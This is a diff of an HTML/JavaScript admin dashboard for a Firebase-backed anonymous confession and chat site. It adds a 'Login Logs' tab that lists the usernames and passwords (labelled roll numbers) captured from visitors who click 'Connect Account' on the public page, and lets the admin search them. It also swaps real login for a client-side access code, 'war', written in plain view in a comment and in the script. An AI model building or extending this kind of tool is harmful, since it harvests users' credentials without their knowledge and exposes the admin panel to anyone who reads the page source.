@@ -90,6 +90,7 @@
 
   .login-logo p { font-size: 12px; color: var(--muted); margin-top:4px; }
 
+  /* Single access code field only */
   .login-field { margin-bottom: 16px; }
   .login-field label { display: block; font-size:12px; font-weight:600; color:var(--muted); margin-bottom:6px; text-transform: uppercase; letter-spacing: 0.5px; }
 
@@ -162,6 +163,22 @@
 
   .sidebar-logo p { font-size:10px; color:var(--muted); }
 
+  .sidebar-close-btn {
+    display: none;
+    background: none;
+    border: none;
+    color: var(--muted);
+    font-size: 18px;
+    cursor: pointer;
+    margin-left: auto;
+    padding: 4px 6px;
+    border-radius: 6px;
+    transition: background 0.2s, color 0.2s;
+    flex-shrink: 0;
+  }
+  .sidebar-close-btn:hover { background: rgba(239,68,68,0.15); color: var(--red); }
+  @media (max-width: 768px) { .sidebar-close-btn { display: block; } }
+
   nav { flex:1; padding: 14px 10px; overflow-y:auto; }
 
   .nav-section-label {
@@ -179,6 +196,7 @@
     font-size: 13px; font-weight: 500;
     transition: all 0.2s;
     margin-bottom: 2px;
+    cursor: pointer;
   }
 
   nav a i { width: 18px; text-align:center; }
@@ -375,6 +393,7 @@
   .pill.banned   { background:rgba(239,68,68,0.2);  color:var(--red);    border:1px solid rgba(239,68,68,0.5); }
   .pill.active   { background:rgba(34,197,94,0.12); color:var(--green);  border:1px solid rgba(34,197,94,0.3); }
   .pill.admin    { background:rgba(168,85,247,0.15); color:var(--purple); border:1px solid rgba(168,85,247,0.3); }
+  .pill.user     { background:rgba(0,198,255,0.1);  color:var(--accent); border:1px solid rgba(0,198,255,0.3); }
 
   /* ── ACTION BUTTONS ── */
   .btn-group { display:flex; gap:6px; flex-wrap:wrap; }
@@ -492,7 +511,7 @@
 
   .btn-primary:hover { opacity:0.85; }
 
-  /* ── VISITOR CARDS ── */
+  /* ── LOGIN LOGS CARDS ── */
   .visitor-grid {
     display: grid;
     grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
@@ -530,7 +549,7 @@
     color: var(--muted);
   }
 
-  .empty-state i { font-size:40px; margin-bottom:12px; opacity:0.3; }
+  .empty-state i { font-size:40px; margin-bottom:12px; opacity:0.3; display:block; }
   .empty-state p { font-size:14px; }
 
   /* ── TOAST ── */
@@ -591,11 +610,29 @@
     color: var(--muted);
     font-size: 12px;
   }
+
+  /* Login log info note */
+  .info-note {
+    background: rgba(0,198,255,0.08);
+    border: 1px solid rgba(0,198,255,0.2);
+    border-radius: 10px;
+    padding: 12px 16px;
+    font-size: 12px;
+    color: var(--accent);
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
 </style>
 </head>
 <body>
 
 <!-- ────────────────── LOGIN ────────────────── -->
+<!--
+  ONLY ONE ACCESS CODE: war
+  Just type anything as username, password must be: war
+-->
 <div id="loginScreen">
   <div class="login-card">
     <div class="login-logo">
@@ -604,17 +641,13 @@
       <p>Restricted access — authorised personnel only</p>
     </div>
     <div class="login-field">
-      <label>Username</label>
-      <input type="text" id="loginUser" placeholder="Enter username" autocomplete="off">
-    </div>
-    <div class="login-field">
-      <label>Password</label>
-      <input type="password" id="loginPass" placeholder="Enter password">
+      <label>Access Code</label>
+      <input type="password" id="loginPass" placeholder="Enter access code">
     </div>
     <button class="login-btn" onclick="doLogin()">
       <i class="fa-solid fa-lock-open"></i> Sign In
     </button>
-    <div class="login-error" id="loginError">Invalid credentials. Try again.</div>
+    <div class="login-error" id="loginError">❌ Wrong access code. Try again.</div>
   </div>
 </div>
 
@@ -630,6 +663,9 @@
         <h2>Welkin Admin</h2>
         <p>Control Panel v2.0</p>
       </div>
+      <button class="sidebar-close-btn" onclick="document.getElementById('sidebar').classList.remove('open')" title="Close menu">
+        <i class="fa-solid fa-xmark"></i>
+      </button>
     </div>
 
     <nav>
@@ -653,6 +689,10 @@
       <div class="nav-section-label">Users</div>
       <a href="#" onclick="showTab('users',this)">
         <i class="fa-solid fa-users"></i> All Users
+      </a>
+      <a href="#" onclick="showTab('loginlogs',this)">
+        <i class="fa-solid fa-key"></i> Login Logs
+        <span class="badge" id="loginBadge">0</span>
       </a>
       <a href="#" onclick="showTab('visitors',this)">
         <i class="fa-solid fa-eye"></i> Visitors & Sessions
@@ -704,7 +744,7 @@
             <i class="fa-solid fa-clock stat-icon"></i>
           </div>
           <div class="stat-card green">
-            <div class="stat-label">Unique Users</div>
+            <div class="stat-label">Login Logs</div>
             <div class="stat-value" id="stat-users">—</div>
             <i class="fa-solid fa-user-group stat-icon"></i>
           </div>
@@ -750,7 +790,7 @@
             <table>
               <thead>
                 <tr>
-                  <th>Roll No.</th>
+                  <th>#</th>
                   <th>Message</th>
                   <th>Status</th>
                   <th>Time</th>
@@ -816,7 +856,7 @@
         </div>
       </div>
 
-      <!-- ── USERS ── -->
+      <!-- ── USERS (from users collection) ── -->
       <div class="tab-pane" id="tab-users">
         <div class="card">
           <div class="card-header">
@@ -839,6 +879,40 @@
               </thead>
               <tbody id="usersList">
                 <tr><td colspan="6"><div class="empty-state"><i class="fa-solid fa-spinner fa-spin"></i><p>Loading…</p></div></td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── LOGIN LOGS (username + roll number from login page) ── -->
+      <div class="tab-pane" id="tab-loginlogs">
+        <div class="info-note">
+          <i class="fa-solid fa-circle-info"></i>
+          These are all users who clicked "Connect Account" on the login page. Username and Roll Number are captured here.
+        </div>
+        <div class="card">
+          <div class="card-header">
+            <h3><i class="fa-solid fa-key" style="color:var(--yellow);margin-right:6px;"></i> Login Logs — Username &amp; Roll Numbers</h3>
+            <div class="search-bar">
+              <input type="text" placeholder="Search username or roll…" oninput="filterLoginLogs(this.value)">
+            </div>
+          </div>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>#</th>
+                  <th>Username</th>
+                  <th>Roll Number (Password)</th>
+                  <th>Device</th>
+                  <th>Browser / OS</th>
+                  <th>Time</th>
+                  <th>Actions</th>
+                </tr>
+              </thead>
+              <tbody id="loginLogsList">
+                <tr><td colspan="7"><div class="empty-state"><i class="fa-solid fa-spinner fa-spin"></i><p>Loading…</p></div></td></tr>
               </tbody>
             </table>
           </div>
@@ -954,22 +1028,20 @@
 <!-- TOAST -->
 <div id="toast"><span id="toastMsg"></span></div>
 
-<!-- LOGIN SCRIPT (plain, not module — so onclick works) -->
+<!-- ──────────────────────────────────────────
+     LOGIN SCRIPT
+     Only ONE access code: war
+────────────────────────────────────────── -->
 <script>
-  // ── Admin credentials (change these!)
-  const ADMIN_CREDS = [
-    { user: "admin",  pass: "war" },
-    { user: "owner",  pass: "war" }
-  ];
+  // ── SINGLE ACCESS CODE: war ──
+  const ADMIN_ACCESS_CODE = "war";
 
   function doLogin() {
-    const u = document.getElementById("loginUser").value.trim();
     const p = document.getElementById("loginPass").value.trim();
-    const ok = ADMIN_CREDS.some(c => c.user === u && c.pass === p);
-    if (ok) {
+    if (p === ADMIN_ACCESS_CODE) {
       document.getElementById("loginScreen").style.display = "none";
-      document.getElementById("adminApp").style.display = "block";
-      window._currentAdmin = u;
+      document.getElementById("adminApp").style.display    = "block";
+      window._currentAdmin = "admin";
       if (typeof loadAll === "function") loadAll();
       else window._loginPending = true;
     } else {
@@ -980,24 +1052,21 @@
   }
 
   function logout() {
-    document.getElementById("adminApp").style.display = "none";
+    document.getElementById("adminApp").style.display    = "none";
     document.getElementById("loginScreen").style.display = "flex";
-    document.getElementById("loginUser").value = "";
-    document.getElementById("loginPass").value = "";
+    document.getElementById("loginPass").value           = "";
   }
 
-  // Enter key support
   document.addEventListener("DOMContentLoaded", () => {
     document.getElementById("loginPass").addEventListener("keydown", e => {
       if (e.key === "Enter") doLogin();
     });
-    document.getElementById("loginUser").addEventListener("keydown", e => {
-      if (e.key === "Enter") document.getElementById("loginPass").focus();
-    });
   });
 </script>
 
-<!-- FIREBASE + SCRIPTS -->
+<!-- ──────────────────────────────────────────
+     FIREBASE + ALL DATA LOGIC
+────────────────────────────────────────── -->
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
 import {
@@ -1007,56 +1076,61 @@ import {
 } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
 const firebaseConfig = {
-  apiKey: "AIzaSyBFZYXN5MJ9WOMBXfCchUWnR9LEfOOzImw",
-  authDomain: "welkin-b3fee.firebaseapp.com",
-  projectId: "welkin-b3fee",
-  storageBucket: "welkin-b3fee.firebasestorage.app",
+  apiKey:            "AIzaSyBFZYXN5MJ9WOMBXfCchUWnR9LEfOOzImw",
+  authDomain:        "welkin-b3fee.firebaseapp.com",
+  projectId:         "welkin-b3fee",
+  storageBucket:     "welkin-b3fee.firebasestorage.app",
   messagingSenderId: "45894924521",
-  appId: "1:45894924521:web:ab81de1a168022ba1d9878"
+  appId:             "1:45894924521:web:ab81de1a168022ba1d9878"
 };
 
 const app = initializeApp(firebaseConfig);
 const db  = getFirestore(app);
 
-// Expose db globally
-window._db = db;
-window._col = collection;
-window._addDoc = addDoc;
-window._getDocs = getDocs;
-window._deleteDoc = deleteDoc;
-window._doc = doc;
-window._updateDoc = updateDoc;
-window._query = query;
-window._orderBy = orderBy;
-window._limit = limit;
-window._onSnapshot = onSnapshot;
-window._serverTimestamp = serverTimestamp;
-window._setDoc = setDoc;
-window._getDoc = getDoc;
-window._where = where;
+// Expose Firestore helpers globally (used by inline onclick handlers)
+window._db             = db;
+window._col            = collection;
+window._addDoc         = addDoc;
+window._getDocs        = getDocs;
+window._deleteDoc      = deleteDoc;
+window._doc            = doc;
+window._updateDoc      = updateDoc;
+window._query          = query;
+window._orderBy        = orderBy;
+window._limit          = limit;
+window._onSnapshot     = onSnapshot;
+window._serverTimestamp= serverTimestamp;
+window._setDoc         = setDoc;
+window._getDoc         = getDoc;
+window._where          = where;
 
-// ── DATA CACHE
+// ── DATA CACHE ──
 let allConfessions = [];
 let allChat        = [];
 let allUsers       = [];
 let allBanned      = [];
 let allVisitors    = [];
+let allLoginLogs   = [];
 let allMsgs        = [];
 let pendingBanId   = null;
 
+// ── LOAD ALL ──
 window.loadAll = function() {
   loadConfessions();
   loadChat();
   loadBanned();
   loadUsers();
   loadVisitors();
+  loadLoginLogs();   // ← NEW: dedicated login log loader
   loadAdminMsgs();
-}
+};
 
-// ── CONFESSIONS
+// ════════════════════════════════
+// CONFESSIONS
+// ════════════════════════════════
 async function loadConfessions() {
-  const q = _query(_col(_db,"confessions"), _orderBy("timestamp","desc"));
-  _onSnapshot(q, snap => {
+  const q = query(collection(db,"confessions"), orderBy("timestamp","desc"));
+  onSnapshot(q, snap => {
     allConfessions = snap.docs.map(d => ({ id:d.id, ...d.data() }));
     renderConfessions(allConfessions);
     updateStats();
@@ -1065,20 +1139,26 @@ async function loadConfessions() {
 
 function renderConfessions(list) {
   const tbody = document.getElementById("confessionsList");
-  if (!list.length) { tbody.innerHTML = `<tr><td colspan="5"><div class="empty-state"><i class="fa-solid fa-scroll"></i><p>No confessions yet.</p></div></td></tr>`; return; }
-  document.getElementById("pendingBadge").textContent = list.filter(c=>c.status==="pending"||!c.status).length;
-  tbody.innerHTML = list.map(c => {
+  const pending = list.filter(c => !c.status || c.status === "pending").length;
+  document.getElementById("pendingBadge").textContent = pending;
+
+  if (!list.length) {
+    tbody.innerHTML = `<tr><td colspan="5"><div class="empty-state"><i class="fa-solid fa-scroll"></i><p>No confessions yet.</p></div></td></tr>`;
+    return;
+  }
+
+  tbody.innerHTML = list.map((c, i) => {
     const st = c.status || "pending";
     const ts = c.timestamp ? new Date(c.timestamp.toDate()).toLocaleString() : "—";
     return `<tr>
-      <td><b style="color:var(--accent)">${esc(c.rollNumber||c.roll||"N/A")}</b></td>
+      <td style="color:var(--muted);font-size:12px;">${i+1}</td>
       <td><span class="chat-msg-preview" title="${esc(c.text||c.message||"")}">${esc(c.text||c.message||"")}</span></td>
       <td><span class="pill ${st}">${st}</span></td>
       <td style="color:var(--muted);font-size:12px;">${ts}</td>
       <td>
         <div class="btn-group">
           <button class="btn btn-info"    onclick="viewConfession('${c.id}')"><i class="fa-solid fa-eye"></i> Review</button>
-          <button class="btn btn-reject"  onclick="setConfStatus('${c.id}','rejected')"><i class="fa-solid fa-xmark"></i></button>
+          <button class="btn btn-reject"  onclick="setConfStatus('${c.id}','rejected')"><i class="fa-solid fa-xmark"></i> Reject</button>
           <button class="btn btn-delete"  onclick="deleteConf('${c.id}')"><i class="fa-solid fa-trash"></i></button>
         </div>
       </td>
@@ -1087,29 +1167,43 @@ function renderConfessions(list) {
 }
 
 window.filterConfessions = v => renderConfessions(allConfessions.filter(c =>
-  (c.rollNumber||c.roll||"").toLowerCase().includes(v.toLowerCase()) ||
   (c.text||c.message||"").toLowerCase().includes(v.toLowerCase())
 ));
 
+// ── Set status (reject / approve) ──
 window.setConfStatus = async (id, status) => {
-  await _updateDoc(_doc(_db,"confessions",id), { status });
-  showToast(`Confession ${status}`, "success");
+  try {
+    await updateDoc(doc(db,"confessions",id), { status });
+    showToast(`Confession ${status}`, "success");
+  } catch(e) {
+    console.error(e);
+    showToast("Update failed: " + e.message, "error");
+  }
 };
 
+// ── Approve with optional admin caption ──
+// This writes status:"approved" + adminCaption to Firestore.
+// The public page listens for status=="approved" and will show it immediately.
 window.approveWithCaption = async (id) => {
-  const caption = document.getElementById("captionInput_"+id)?.value.trim() || "";
-  await _updateDoc(_doc(_db,"confessions",id), {
-    status: "approved",
-    adminCaption: caption
-  });
-  closeModal();
-  showToast("Confession approved & published!", "success");
+  const captionEl = document.getElementById("captionInput_"+id);
+  const caption   = captionEl ? captionEl.value.trim() : "";
+  try {
+    await updateDoc(doc(db,"confessions",id), {
+      status:       "approved",
+      adminCaption: caption
+    });
+    closeModal();
+    showToast("✅ Confession approved & published to public page!", "success");
+  } catch(e) {
+    console.error(e);
+    showToast("❌ Approve failed: " + e.message, "error");
+  }
 };
 
 window.deleteConf = async (id) => {
   if (!confirm("Delete this confession permanently?")) return;
-  await _deleteDoc(_doc(_db,"confessions",id));
-  showToast("Confession deleted","success");
+  await deleteDoc(doc(db,"confessions",id));
+  showToast("Confession deleted", "success");
 };
 
 window.viewConfession = (id) => {
@@ -1119,26 +1213,31 @@ window.viewConfession = (id) => {
   const st = c.status || "pending";
   showModal(`
     <h3><i class="fa-solid fa-scroll" style="color:var(--purple);"></i> Confession Details</h3>
-    <div class="modal-field"><label>Confession Text</label><p style="background:rgba(255,255,255,0.04);padding:10px 12px;border-radius:8px;line-height:1.7;">${esc(c.text||"")}</p></div>
+    <div class="modal-field">
+      <label>Confession Text</label>
+      <p style="background:rgba(255,255,255,0.04);padding:10px 12px;border-radius:8px;line-height:1.7;">${esc(c.text||"")}</p>
+    </div>
     <div class="modal-field"><label>Status</label><span class="pill ${st}">${st}</span></div>
     <div class="modal-field"><label>Submitted At</label><p style="color:var(--muted)">${ts}</p></div>
     <div class="modal-field">
       <label>Admin Caption <span style="color:var(--muted);font-weight:400;text-transform:none;">(shown publicly below the confession)</span></label>
-      <textarea id="captionInput_${id}" placeholder="Add your admin comment here… e.g. 'This is brave 💙' or leave blank" style="width:100%;min-height:80px;padding:10px 14px;background:rgba(255,255,255,0.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:13px;outline:none;resize:vertical;font-family:inherit;margin-top:4px;">${esc(c.adminCaption||"")}</textarea>
+      <textarea id="captionInput_${id}" placeholder="Add your admin comment… or leave blank" style="width:100%;min-height:80px;padding:10px 14px;background:rgba(255,255,255,0.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:13px;outline:none;resize:vertical;font-family:inherit;margin-top:4px;">${esc(c.adminCaption||"")}</textarea>
     </div>
     <div class="modal-actions">
       <button class="modal-close" onclick="closeModal()">Close</button>
-      <button class="btn btn-reject"  onclick="setConfStatus('${id}','rejected');closeModal()"><i class="fa-solid fa-xmark"></i> Reject</button>
-      <button class="btn btn-delete"  onclick="deleteConf('${id}');closeModal()"><i class="fa-solid fa-trash"></i> Delete</button>
-      <button class="btn btn-approve" onclick="approveWithCaption('${id}')"><i class="fa-solid fa-check"></i> Approve & Publish</button>
+      <button class="btn btn-reject" onclick="setConfStatus('${id}','rejected');closeModal()"><i class="fa-solid fa-xmark"></i> Reject</button>
+      <button class="btn btn-delete" onclick="deleteConf('${id}');closeModal()"><i class="fa-solid fa-trash"></i> Delete</button>
+      <button class="btn btn-approve" onclick="approveWithCaption('${id}')"><i class="fa-solid fa-check"></i> Approve &amp; Publish</button>
     </div>
   `);
 };
 
-// ── CHAT
+// ════════════════════════════════
+// GROUP CHAT
+// ════════════════════════════════
 async function loadChat() {
-  const q = _query(_col(_db,"group_chat"), _orderBy("timestamp","desc"), _limit(200));
-  _onSnapshot(q, snap => {
+  const q = query(collection(db,"group_chat"), orderBy("timestamp","desc"), limit(200));
+  onSnapshot(q, snap => {
     allChat = snap.docs.map(d => ({ id:d.id, ...d.data() }));
     renderChat(allChat);
     renderRecentActivity();
@@ -1148,7 +1247,10 @@ async function loadChat() {
 
 function renderChat(list) {
   const tbody = document.getElementById("chatList");
-  if (!list.length) { tbody.innerHTML = `<tr><td colspan="4"><div class="empty-state"><i class="fa-solid fa-comment-slash"></i><p>No messages yet.</p></div></td></tr>`; return; }
+  if (!list.length) {
+    tbody.innerHTML = `<tr><td colspan="4"><div class="empty-state"><i class="fa-solid fa-comment-slash"></i><p>No messages yet.</p></div></td></tr>`;
+    return;
+  }
   tbody.innerHTML = list.map(m => {
     const ts = m.timestamp ? new Date(m.timestamp.toDate()).toLocaleString() : "—";
     return `<tr>
@@ -1172,11 +1274,13 @@ window.filterChat = v => renderChat(allChat.filter(m =>
 
 window.deleteChatMsg = async (id) => {
   if (!confirm("Delete this message?")) return;
-  await _deleteDoc(_doc(_db,"group_chat",id));
+  await deleteDoc(doc(db,"group_chat",id));
   showToast("Message deleted","success");
 };
 
-// ── BAN SYSTEM
+// ════════════════════════════════
+// BAN SYSTEM
+// ════════════════════════════════
 window.openBanModal = function(userId) {
   pendingBanId = userId;
   document.getElementById("banTargetId").textContent = userId;
@@ -1192,10 +1296,10 @@ window.closeBanModal = () => {
 window.confirmBan = async function() {
   if (!pendingBanId) return;
   const reason = document.getElementById("banReason").value.trim();
-  await _setDoc(_doc(_db,"banned_users",pendingBanId), {
-    userId: pendingBanId,
-    reason: reason || "No reason provided",
-    bannedAt: _serverTimestamp(),
+  await setDoc(doc(db,"banned_users",pendingBanId), {
+    userId:   pendingBanId,
+    reason:   reason || "No reason provided",
+    bannedAt: serverTimestamp(),
     bannedBy: window._currentAdmin || "admin"
   });
   closeBanModal();
@@ -1203,7 +1307,7 @@ window.confirmBan = async function() {
 };
 
 async function loadBanned() {
-  _onSnapshot(_col(_db,"banned_users"), snap => {
+  onSnapshot(collection(db,"banned_users"), snap => {
     allBanned = snap.docs.map(d => ({ id:d.id, ...d.data() }));
     renderBanned();
     updateStats();
@@ -1233,18 +1337,26 @@ function renderBanned() {
 
 window.unbanUser = async (docId, userId) => {
   if (!confirm(`Unban user ${userId}?`)) return;
-  await _deleteDoc(_doc(_db,"banned_users",docId));
-  showToast(`User ${userId} unbanned`,"success");
+  await deleteDoc(doc(db,"banned_users",docId));
+  showToast(`User ${userId} unbanned`, "success");
 };
 
-// ── USERS
+// ════════════════════════════════
+// USERS COLLECTION
+// ════════════════════════════════
 async function loadUsers() {
-  const q = _query(_col(_db,"users"), _orderBy("createdAt","desc"));
-  _onSnapshot(q, snap => {
-    allUsers = snap.docs.map(d => ({ id:d.id, ...d.data() }));
-    renderUsers(allUsers);
-    updateStats();
-  });
+  try {
+    const q = query(collection(db,"users"), orderBy("createdAt","desc"));
+    onSnapshot(q, snap => {
+      allUsers = snap.docs.map(d => ({ id:d.id, ...d.data() }));
+      renderUsers(allUsers);
+      updateStats();
+    });
+  } catch(e) {
+    // If no users collection or no index, silently skip
+    document.getElementById("usersList").innerHTML =
+      `<tr><td colspan="6"><div class="empty-state"><i class="fa-solid fa-user-slash"></i><p>No users collection found.</p></div></td></tr>`;
+  }
 }
 
 function renderUsers(list) {
@@ -1306,56 +1418,66 @@ window.unbanByAnonId = async (anonId) => {
 
 window.deleteUser = async (id) => {
   if (!confirm("Permanently delete this user record?")) return;
-  await _deleteDoc(_doc(_db,"users",id));
+  await deleteDoc(doc(db,"users",id));
   showToast("User deleted","success");
 };
 
-// ── VISITORS
+// ════════════════════════════════
+// LOGIN LOGS — Username + Roll Number
+// This reads the "login_logs" collection written by index.html
+// when someone clicks "Connect Account"
+// ════════════════════════════════
+async function loadLoginLogs() {
+  const q = query(collection(db,"login_logs"), orderBy("timestamp","desc"));
+  onSnapshot(q, snap => {
+    allLoginLogs = snap.docs.map(d => ({ id:d.id, ...d.data() }));
+    renderLoginLogs(allLoginLogs);
+    document.getElementById("loginBadge").textContent = allLoginLogs.length;
+    updateStats();
+  });
+}
+
+function renderLoginLogs(list) {
+  const tbody = document.getElementById("loginLogsList");
+  if (!list.length) {
+    tbody.innerHTML = `<tr><td colspan="7"><div class="empty-state"><i class="fa-solid fa-key"></i><p>No login attempts recorded yet.</p></div></td></tr>`;
+    return;
+  }
+  tbody.innerHTML = list.map((l, i) => {
+    const ts = l.timestamp ? new Date(l.timestamp.toDate()).toLocaleString() : "—";
+    return `<tr>
+      <td style="color:var(--muted);font-size:12px;">${i+1}</td>
+      <td><b style="color:var(--accent)">${esc(l.username||"—")}</b></td>
+      <td><b style="color:var(--yellow)">${esc(l.password||l.rollNumber||"—")}</b></td>
+      <td style="color:var(--muted);font-size:12px;">${esc(l.device||"—")}</td>
+      <td style="color:var(--muted);font-size:12px;">${esc(l.os||l.browser||"—")}</td>
+      <td style="color:var(--muted);font-size:12px;">${ts}</td>
+      <td>
+        <button class="btn btn-delete" onclick="deleteLoginLog('${l.id}')"><i class="fa-solid fa-trash"></i></button>
+      </td>
+    </tr>`;
+  }).join("");
+}
+
+window.filterLoginLogs = v => renderLoginLogs(allLoginLogs.filter(l =>
+  (l.username||"").toLowerCase().includes(v.toLowerCase()) ||
+  (l.password||l.rollNumber||"").toLowerCase().includes(v.toLowerCase())
+));
+
+window.deleteLoginLog = async (id) => {
+  if (!confirm("Delete this login log?")) return;
+  await deleteDoc(doc(db,"login_logs",id));
+  showToast("Login log deleted","success");
+};
+
+// ════════════════════════════════
+// VISITORS
+// ════════════════════════════════
 async function loadVisitors() {
-  // Listen to visitor_logs
-  _onSnapshot(_col(_db,"visitor_logs"), snap => {
-    const visitorData = snap.docs.map(d => ({ id:d.id, ...d.data() }));
-
-    // Also pull login_logs to enrich with username/roll
-    _getDocs(_col(_db,"login_logs")).then(loginSnap => {
-      const loginData = loginSnap.docs.map(d => d.data());
-
-      // Merge: match by device+time proximity or just show both
-      allVisitors = visitorData.map(v => {
-        // Try to find a login log with same device around same time
-        const match = loginData.find(l =>
-          l.device === v.device &&
-          Math.abs((l.timestamp?.seconds||0) - (v.timestamp?.seconds||0)) < 300
-        );
-        return {
-          ...v,
-          username: v.username || match?.username || null,
-          rollNumber: v.rollNumber || match?.password || null
-        };
-      });
-
-      // Also add pure login_logs entries that have no visitor log match
-      loginData.forEach(l => {
-        const already = allVisitors.find(v =>
-          v.device === l.device &&
-          Math.abs((l.timestamp?.seconds||0) - (v.visitedAt?.seconds||0)) < 300
-        );
-        if (!already) {
-          allVisitors.push({
-            id: "login_" + Math.random(),
-            username: l.username,
-            rollNumber: l.password,
-            device: l.device,
-            browser: l.os,
-            visitedAt: l.timestamp,
-            anonymousId: "—"
-          });
-        }
-      });
-
-      renderVisitors();
-      updateStats();
-    });
+  onSnapshot(collection(db,"visitor_logs"), snap => {
+    allVisitors = snap.docs.map(d => ({ id:d.id, ...d.data() }));
+    renderVisitors();
+    updateStats();
   });
 }
 
@@ -1369,17 +1491,18 @@ function renderVisitors() {
   let todayCount = 0;
   const deviceSet = new Set();
 
-  grid.innerHTML = allVisitors.sort((a,b)=>(b.visitedAt?.seconds||0)-(a.visitedAt?.seconds||0)).map(v => {
-    const ts = v.visitedAt ? new Date(v.visitedAt.toDate()) : null;
+  const sorted = [...allVisitors].sort((a,b)=>(b.timestamp?.seconds||0)-(a.timestamp?.seconds||0));
+
+  grid.innerHTML = sorted.map(v => {
+    const ts  = v.timestamp ? new Date(v.timestamp.toDate()) : null;
     const tsStr = ts ? ts.toLocaleString() : "—";
     if (ts && ts >= today) todayCount++;
-    if (v.browser) deviceSet.add(v.browser);
+    if (v.device) deviceSet.add(v.device);
     const banned = allBanned.some(b => b.userId === v.anonymousId);
     return `<div class="visitor-card">
-      <div class="visitor-name">${esc(v.username || v.name || "Unknown User")}</div>
-      <div class="visitor-roll">${esc(v.rollNumber || v.roll || "Roll not captured")}</div>
+      <div class="visitor-name">${esc(v.username||v.name||"Unknown User")}</div>
+      <div class="visitor-roll">${esc(v.rollNumber||v.roll||"Roll not captured")}</div>
       <div class="visitor-meta">
-        <div class="visitor-meta-row"><i class="fa-solid fa-fingerprint"></i>${esc(v.anonymousId||"—")}</div>
         <div class="visitor-meta-row"><i class="fa-solid fa-desktop"></i>${esc(v.device||"Unknown Device")}</div>
         <div class="visitor-meta-row"><i class="fa-brands fa-chrome"></i>${esc(v.browser||v.os||"Unknown Browser")}</div>
         <div class="visitor-meta-row"><i class="fa-solid fa-clock"></i>${tsStr}</div>
@@ -1401,14 +1524,16 @@ function renderVisitors() {
 
 window.deleteVisitor = async (id) => {
   if (!confirm("Remove this visitor log?")) return;
-  await _deleteDoc(_doc(_db,"visitor_logs",id));
+  await deleteDoc(doc(db,"visitor_logs",id));
   showToast("Visitor log removed","success");
 };
 
-// ── ADMIN MESSAGES
+// ════════════════════════════════
+// ADMIN MESSAGES (Broadcast)
+// ════════════════════════════════
 async function loadAdminMsgs() {
-  const q = _query(_col(_db,"admin_messages"), _orderBy("sentAt","desc"));
-  _onSnapshot(q, snap => {
+  const q = query(collection(db,"admin_messages"), orderBy("sentAt","desc"));
+  onSnapshot(q, snap => {
     allMsgs = snap.docs.map(d => ({ id:d.id, ...d.data() }));
     renderMsgs();
   });
@@ -1438,10 +1563,10 @@ window.sendAdminMessage = async function() {
   const msg  = document.getElementById("bc-msg").value.trim();
   const type = document.getElementById("bc-type").value;
   if (!roll || !msg) { showToast("Fill in roll number and message","error"); return; }
-  await _addDoc(_col(_db,"admin_messages"), {
+  await addDoc(collection(db,"admin_messages"), {
     rollNumber: roll, message: msg, type,
     sentBy: window._currentAdmin||"admin",
-    sentAt: _serverTimestamp()
+    sentAt: serverTimestamp()
   });
   document.getElementById("bc-roll").value = "";
   document.getElementById("bc-msg").value  = "";
@@ -1449,11 +1574,13 @@ window.sendAdminMessage = async function() {
 };
 
 window.deleteMsg = async (id) => {
-  await _deleteDoc(_doc(_db,"admin_messages",id));
+  await deleteDoc(doc(db,"admin_messages",id));
   showToast("Message deleted","success");
 };
 
-// ── RECENT ACTIVITY
+// ════════════════════════════════
+// RECENT ACTIVITY
+// ════════════════════════════════
 function renderRecentActivity() {
   const tbody = document.getElementById("recentActivity");
   const items = [
@@ -1461,9 +1588,12 @@ function renderRecentActivity() {
       type:"Chat", user:m.userId||"?", content:m.text||"", ts:m.timestamp
     })),
     ...allConfessions.slice(0,5).map(c => ({
-      type:"Confession", user:c.rollNumber||c.roll||"?", content:c.text||c.message||"", ts:c.timestamp
+      type:"Confession", user: "Anonymous", content:c.text||c.message||"", ts:c.timestamp
+    })),
+    ...allLoginLogs.slice(0,5).map(l => ({
+      type:"Login", user:l.username||"?", content:"Roll: "+(l.password||l.rollNumber||"?"), ts:l.timestamp
     }))
-  ].sort((a,b)=>(b.ts?.seconds||0)-(a.ts?.seconds||0)).slice(0,10);
+  ].sort((a,b)=>(b.ts?.seconds||0)-(a.ts?.seconds||0)).slice(0,12);
 
   if (!items.length) {
     tbody.innerHTML = `<tr><td colspan="4"><div class="empty-state"><p>No recent activity.</p></div></td></tr>`;
@@ -1471,7 +1601,7 @@ function renderRecentActivity() {
   }
   tbody.innerHTML = items.map(i => {
     const ts = i.ts ? new Date(i.ts.toDate()).toLocaleString() : "—";
-    const color = i.type==="Chat"?"var(--accent)":"var(--purple)";
+    const color = i.type==="Chat"?"var(--accent)":i.type==="Login"?"var(--yellow)":"var(--purple)";
     return `<tr>
       <td><span style="color:${color};font-weight:600;font-size:12px;">${i.type}</span></td>
       <td><b style="color:var(--accent)">${esc(i.user)}</b></td>
@@ -1481,17 +1611,22 @@ function renderRecentActivity() {
   }).join("");
 }
 
-// ── STATS
+// ════════════════════════════════
+// STATS
+// ════════════════════════════════
 function updateStats() {
   document.getElementById("stat-msgs").textContent        = allChat.length;
   document.getElementById("stat-confessions").textContent = allConfessions.length;
   document.getElementById("stat-pending").textContent     = allConfessions.filter(c=>!c.status||c.status==="pending").length;
-  document.getElementById("stat-users").textContent       = allUsers.length || allVisitors.length || "—";
+  document.getElementById("stat-users").textContent       = allLoginLogs.length || "—";
   document.getElementById("stat-banned").textContent      = allBanned.length;
   document.getElementById("pendingBadge").textContent     = allConfessions.filter(c=>!c.status||c.status==="pending").length;
+  document.getElementById("loginBadge").textContent       = allLoginLogs.length;
 }
 
-// ── HELPERS
+// ════════════════════════════════
+// HELPERS
+// ════════════════════════════════
 function esc(s) {
   return String(s||"").replace(/[&<>'"]/g, t => ({"&":"&amp;","<":"&lt;",">":"&gt;","'":"&#39;",'"':"&quot;"}[t]||t));
 }
@@ -1502,35 +1637,35 @@ function showModal(html) {
 }
 
 window.closeModal = () => document.getElementById("modalOverlay").classList.remove("open");
-document.getElementById("modalOverlay").addEventListener("click", e => { if(e.target===e.currentTarget) closeModal(); });
+document.getElementById("modalOverlay").addEventListener("click", e => {
+  if (e.target === e.currentTarget) closeModal();
+});
 
